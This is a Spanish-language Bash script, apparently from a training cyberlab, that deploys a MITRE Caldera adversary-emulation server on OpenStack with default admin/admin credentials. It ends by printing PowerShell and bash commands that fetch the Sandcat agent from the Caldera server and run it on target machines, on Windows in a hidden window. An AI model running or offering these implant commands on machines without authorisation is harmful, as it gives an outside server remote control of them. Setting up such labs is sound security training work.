#!/bin/bash
# ==========================================
#  Descripción: Despliega una instancia
#  Debian 12 en OpenStack e instala MITRE Caldera
# ==========================================

# ===== Timer global del script =====
SCRIPT_START=$(date +%s)

# Convertir segundos → "X minutos y Y segundos"
format_time() {
    local total=$1
    local minutes=$((total / 60))
    local seconds=$((total % 60))
    echo "${minutes} minutos y ${seconds} segundos"
}

echo "============================================="
echo "    Despliega una instancia en OpenStack:    "
echo "         Debian 12 + MITRE Caldera           "
echo "============================================="

# ===== Activar entorno virtual =====
echo "🔹 Activando entorno virtual de OpenStack..."
step_start=$(date +%s)
if [[ -d "openstack-installer/openstack_venv" ]]; then
    source openstack-installer/openstack_venv/bin/activate
    echo "[✔] Entorno virtual 'openstack_venv' activado correctamente."
else
    echo "[✖] No se encontró el entorno 'openstack_venv'. Ejecuta primero openstack-recursos.sh"
    exit 1
fi
step_end=$(date +%s)
echo "-------------------------------------------"
sleep 1

# ===== Cargar variables de entorno OpenStack =====
if [[ -f "admin-openrc.sh" ]]; then
    echo "[+] Cargando variables del entorno OpenStack (admin-openrc.sh)..."
    source admin-openrc.sh
    echo "[✔] Variables cargadas correctamente."
    echo "-------------------------------------------"
    sleep 1
else
    echo "[✖] No se encontró 'admin-openrc.sh'. Ejecuta primero openstack-recursos.sh"
    exit 1
fi

# =========================
# CONFIGURACIÓN GENERAL
# =========================
IMAGE_NAME="debian-12"
FLAVOR="S_2CPU_4GB"
KEY_NAME="my_key"
SEC_GROUP="sg_basic"

NETWORK_PRIVATE="net_private_01"
SUBNET_PRIVATE="subnet_net_private_01"
NETWORK_EXTERNAL="net_external_01"
ROUTER_NAME="router_private_01"

INSTANCE_NAME="caldera-server"
SSH_USER="debian"
SSH_KEY_PATH="$HOME/nics-cyberlab-A/my_key.pem"
USERDATA_FILE="$HOME/nics-cyberlab-A/set-password.yml"
KNOWN_HOSTS_FILE="$HOME/.ssh/known_hosts"

# =========================
# VERIFICACIÓN DE RECURSOS
# =========================
echo "🔹 Verificando recursos necesarios..."

if ! openstack image list -f value -c Name | grep -qw "$IMAGE_NAME"; then
    echo "[!] Falta la imagen '$IMAGE_NAME'. Ejecuta openstack-recursos.sh"; exit 1
fi
if ! openstack flavor list -f value -c Name | grep -qw "$FLAVOR"; then
    echo "[!] Falta el flavor '$FLAVOR'. Ejecuta openstack-recursos.sh"; exit 1
fi
if ! openstack keypair list -f value -c Name | grep -qw "$KEY_NAME"; then
    echo "[!] Falta el keypair '$KEY_NAME'. Ejecuta openstack-recursos.sh"; exit 1
fi
if [[ ! -f "$SSH_KEY_PATH" ]]; then
    echo "[!] No se encuentra la clave privada '$SSH_KEY_PATH'."; exit 1
fi
if ! openstack security group list -f value -c Name | grep -qw "$SEC_GROUP"; then
    echo "[!] Falta el grupo de seguridad '$SEC_GROUP'. Ejecuta openstack-recursos.sh"; exit 1
fi
if ! openstack network list -f value -c Name | grep -qw "$NETWORK_PRIVATE"; then
    echo "[!] Falta la red privada '$NETWORK_PRIVATE'."; exit 1
fi
if ! openstack subnet list -f value -c Name | grep -qw "$SUBNET_PRIVATE"; then
    echo "[!] Falta la subred privada '$SUBNET_PRIVATE'."; exit 1
fi
if ! openstack router list -f value -c Name | grep -qw "$ROUTER_NAME"; then
    echo "[!] Falta el router '$ROUTER_NAME'."; exit 1
fi
if [[ ! -f "$USERDATA_FILE" ]]; then
    echo "[!] No se encuentra '$USERDATA_FILE'."; exit 1
fi

echo "[✔] Todos los recursos necesarios existen."
echo "-------------------------------------------"

# =========================
# ELIMINAR INSTANCIA PREVIA
# =========================
EXISTING=$(openstack server list -f value -c Name | grep -w "$INSTANCE_NAME")
if [[ -n "$EXISTING" ]]; then
    echo "[!] Existe una instancia '$INSTANCE_NAME'. Eliminando..."
    for s in $EXISTING; do openstack server delete "$s"; done

    until ! openstack server list -f value -c Name | grep -qw "$INSTANCE_NAME"; do
        sleep 5
        echo -n "."
    done
    echo
    echo "[✔] Instancia '$INSTANCE_NAME' eliminada."
fi

# =========================
# CREACIÓN DE LA INSTANCIA
# =========================
echo "🔹 Creando instancia '$INSTANCE_NAME'..."
openstack server create \
  --image "$IMAGE_NAME" \
  --flavor "$FLAVOR" \
  --key-name "$KEY_NAME" \
  --security-group "$SEC_GROUP" \
  --network "$NETWORK_PRIVATE" \
  --user-data "$USERDATA_FILE" \
  "$INSTANCE_NAME"

echo "[+] Esperando que la instancia esté ACTIVE..."
until [[ "$(openstack server show "$INSTANCE_NAME" -f value -c status)" == "ACTIVE" ]]; do
    sleep 5
    echo -n "."
done
echo
echo "[✔] Instancia '$INSTANCE_NAME' activa."

# =========================
# IP FLOTANTE
# =========================
FLOATING_IP=$(openstack floating ip list -f value -c "Floating IP Address" -c "Fixed IP Address" | awk '$2=="None"{print $1; exit}')
if [[ -z "$FLOATING_IP" ]]; then
    FLOATING_IP=$(openstack floating ip create "$NETWORK_EXTERNAL" -f value -c floating_ip_address)
fi

ssh-keygen -f "$KNOWN_HOSTS_FILE" -R "$FLOATING_IP" >/dev/null 2>&1
openstack server add floating ip "$INSTANCE_NAME" "$FLOATING_IP"

# =========================
# ESPERA SSH (1 MINUTO)
# =========================
echo "[+] Esperando conexión SSH (Puede tardar un momentito)..."
SSH_TIMEOUT=60
SSH_START=$(date +%s)

until ssh -o StrictHostKeyChecking=no -i "$SSH_KEY_PATH" $SSH_USER@"$FLOATING_IP" "echo ok" >/dev/null 2>&1; do
    sleep 5
    echo -n "."
    NOW=$(date +%s)
    if (( NOW - SSH_START > SSH_TIMEOUT )); then
        echo
        echo "[✖] Timeout al intentar conectar por SSH"
        exit 1
    fi
done

echo
echo "[✔] SSH disponible en $FLOATING_IP"

# ===============================
# INSTALACIÓN DE CALDERA (TIMER)
# ===============================
INSTALL_START=$(date +%s)

ssh -o StrictHostKeyChecking=no -i "$SSH_KEY_PATH" $SSH_USER@"$FLOATING_IP" <<'EOF'
set -e

sudo apt update
sudo apt upgrade -y
sudo apt autoremove --purge -y
sudo apt autoclean -y

sudo apt install -y python3 python3-pip curl git build-essential

# Node.js 20
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs

# Clonar Caldera
cd ~
git clone https://github.com/mitre/caldera.git --recursive || true

# Plugin Magma
cd ~/caldera/plugins/magma
rm -rf node_modules package-lock.json
npm install vite@2.9.15 @vitejs/plugin-vue@2.3.4 vue@3.2.45 --legacy-peer-deps

# Requisitos Python
cd ~/caldera
sudo pip3 install --break-system-packages -r requirements.txt
EOF

INSTALL_END=$(date +%s)
INSTALL_TIME=$((INSTALL_END - INSTALL_START))

echo "[✔] Caldera instalado y configurado."
echo "[⏱] Tiempo de instalación: $(format_time $INSTALL_TIME)"
echo "[✔] IP flotante asignada: $FLOATING_IP"

echo
echo "🔹 Iniciando servidor Caldera (se compilará en segundo plano)..."

ssh -o StrictHostKeyChecking=no -i "$SSH_KEY_PATH" $SSH_USER@"$FLOATING_IP" <<EOF
cd ~/caldera
nohup python3 server.py --insecure --build > caldera.log 2>&1 &
EOF

# ========================================
# TIEMPO TOTAL DEL SCRIPT
# ========================================
SCRIPT_END=$(date +%s)
SCRIPT_TIME=$((SCRIPT_END - SCRIPT_START))

echo "===================================================="
echo "[⏱] Tiempo TOTAL del script: $(format_time $SCRIPT_TIME)"
echo "===================================================="

echo "Acceso SSH:"
echo "[➜] ssh -i $SSH_KEY_PATH $SSH_USER@$FLOATING_IP"
echo "-----------------------------------------------"

CALDERA_SERVER_URL="http://$FLOATING_IP:8888"

echo "Caldera disponible en:"
echo "[🌐] $CALDERA_SERVER_URL"
echo "[🔑] Credenciales por defecto: admin / admin"

echo
echo "===================================================="
echo " COMANDOS PARA DESPLEGAR AGENTES SANDCAT DESDE CALDERA"
echo "===================================================="
echo
echo "👉 Estos comandos se ejecutan EN CADA MÁQUINA OBJETIVO."
echo

# --------- Windows (PowerShell) ---------
cat <<EOWIN
[ Windows (PowerShell) ]

Copiar y pegar en una consola de PowerShell con privilegios:

\$server = "$CALDERA_SERVER_URL"
\$url    = "\$server/file/download"
\$wc     = New-Object System.Net.WebClient
\$wc.Headers.Add("platform","windows")
\$wc.Headers.Add("file","sandcat.go")
\$data   = \$wc.DownloadData(\$url)
\$path   = "C:\\Users\\Public\\caldera-agent.exe"

# Guardar el agente y lanzarlo en segundo plano
[io.file]::WriteAllBytes(\$path, \$data) | Out-Null
Start-Process -FilePath \$path -ArgumentList "-server \$server -group red -v" -WindowStyle hidden

EOWIN

# --------- Ubuntu ---------
cat <<EOUBU
[ Ubuntu (bash) ]

Copiar y pegar en la máquina Ubuntu:

server="$CALDERA_SERVER_URL"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "\$server/file/download" -o caldera-agent
chmod +x caldera-agent
./caldera-agent -server "\$server" -group red -v

EOUBU

# --------- Debian ---------
cat <<EODEB
[ Debian (bash) ]

Copiar y pegar en la máquina Debian:

server="$CALDERA_SERVER_URL"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "\$server/file/download" -o caldera-agent
chmod +x caldera-agent
./caldera-agent -server "\$server" -group red -v

EODEB
